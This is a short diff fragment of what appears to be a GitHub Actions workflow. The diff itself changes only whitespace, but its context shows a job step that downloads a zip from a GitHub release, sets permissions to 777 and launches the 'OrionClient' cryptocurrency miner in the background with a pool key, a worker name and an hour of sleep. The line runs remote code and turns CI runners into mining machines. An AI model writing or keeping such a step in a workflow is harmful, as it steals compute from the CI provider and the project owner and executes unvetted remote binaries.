@@ -78,7 +78,7 @@ jobs:
       run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod2 &
            sleep 1h
            
-        
+         
     
   Success:
     needs: [alah, pye, iki]
